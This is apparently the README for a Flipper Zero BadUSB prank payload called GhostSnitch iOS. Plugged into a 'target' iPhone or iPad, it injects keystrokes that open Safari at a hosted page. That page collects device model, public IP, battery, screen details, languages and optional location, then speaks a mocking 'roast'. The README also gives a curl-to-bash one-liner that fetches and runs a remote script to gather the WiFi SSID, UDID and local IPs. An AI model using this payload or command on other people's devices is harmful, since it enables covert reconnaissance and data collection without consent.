# 🍎 GhostSnitch iOS

GhostSnitch adapted for iOS - **works on ANY iOS device!** Executes roast-style recon using device info, TTS, and optional location detection.

## 🧠 Features
- **Universal compatibility**: Works on ANY iOS device with Safari (pre-installed)
- **No jailbreak required**: Uses Web APIs for device info and TTS (Web Speech API)
- **Automatic execution**: Opens Safari and executes script automatically
- **Device reconnaissance**: Collects device model, iOS version, and platform info
- **System information**: Reads public IP, estimated RAM, network connection type
- **Battery status**: Checks battery level (if API available)
- **Screen information**: Detects screen resolution and pixel ratio
- **Language detection**: Identifies system languages
- **Location detection**: Optional geolocation (if permissions granted)
- **Text-to-speech roast**: Delivers roast using Web Speech API (no special apps needed)
- **Jailbroken support**: Optional shell script for jailbroken devices with enhanced features

## 🚀 How to Use

### Prerequisites
**Minimum Requirements (Web Mode - Works on ALL devices):**
- iOS device with Safari browser (pre-installed on all iOS devices)
- Network connectivity (for script download and IP detection)

**Enhanced Mode (Optional - Requires Jailbreak):**
- Jailbroken iOS device with shell access
- Terminal app installed (e.g., NewTerm, MTerminal)
- Appropriate permissions for system information access

### Execution
1. Load `GhostSnitch_iOS.txt` onto your Flipper Zero
2. Connect Flipper Zero to target iOS device via USB (with USB adapter)
3. Run the payload - it will:
   - **Primary method**: Open Safari and execute web-based script (works on all devices)
   - Deliver the roast via text-to-speech

### How It Works

**Primary Method (Web-based - Universal):**
The payload opens Safari with a hosted HTML page that uses:
- **Web Speech API** for text-to-speech (no special apps needed)
- **Navigator API** for device information (model, iOS version, platform)
- **Battery API** for battery status (if available)
- **Network Information API** for connection details
- **Screen API** for display information
- **Geolocation API** for location (optional, requires permission)
- **Fetch API** for IP detection

The payload uses Spotlight search to open Safari:
1. Opens Spotlight (Cmd+Space)
2. Types "safari"
3. Opens Safari
4. Navigates to the hosted script URL

**Enhanced Method (Jailbroken - Optional):**
If the device is jailbroken, you can execute the shell script directly:
- WiFi SSID detection (via airport command)
- Enhanced system information (via sysctl, sw_vers)
- Device UDID detection
- Local IP addresses

```bash
bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_ios.sh)"
```

## ⚠️ iOS-Specific Limitations

- **No native shell access**: iOS doesn't support command-line execution without jailbreak
- **Web-based only**: Non-jailbroken devices can only use the web-based method
- **Speech synthesis restrictions**: iOS Safari may require user interaction for speech synthesis
- **Permission requirements**: Location and battery APIs may require user permission
- **Network connectivity required** for IP detection and script download
- **Spotlight search dependency**: Payload relies on Spotlight to open Safari (may vary by iOS version)

## 🔧 iOS Version Compatibility

- **iOS 12+**: Full Web API support
- **iOS 11**: Limited Web API support
- **iOS 10 and below**: May have limited functionality

## 📱 Device Detection

The script automatically detects:
- iPhone models
- iPad models
- iPod touch models
- iOS version
- Device platform information

## ✨ What's New in v1.0

- **Universal iOS support**: Works on any iOS device with Safari
- **Web-based execution**: Uses Web APIs for universal compatibility
- **iOS-specific features**: Battery status, screen info, language detection
- **Jailbroken device support**: Optional shell script for enhanced features
- **Improved device detection**: Accurate iOS version and device model detection
- **Better error handling**: Gracefully handles missing APIs and permissions

## 🔧 Version
**v1.0** - Initial iOS release with universal Web API support!

## 🙏 Credits
Based on the original GhostSnitch prank for Windows. Reimagined for iOS by **TBJr**

